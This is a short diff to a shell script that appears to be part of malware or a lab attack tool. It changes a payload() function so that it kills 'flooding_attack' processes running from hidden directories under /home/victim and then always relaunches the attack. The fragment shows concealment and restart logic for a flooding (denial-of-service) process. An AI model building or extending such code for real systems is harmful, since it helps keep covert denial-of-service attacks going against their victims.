@@ -37,9 +37,10 @@ payload() {
   is_process_exist
   if [ $? -eq 0 ]; then # positive match
     echo "Attack already launched!"
-  else
-    check_file_and_launch_attack
+    pkill -f /home/victim/.etc/.module/flooding_attack
+    pkill -f /home/victim/.var/.module/flooding_attack
   fi
+  check_file_and_launch_attack
 }
 
 main() {
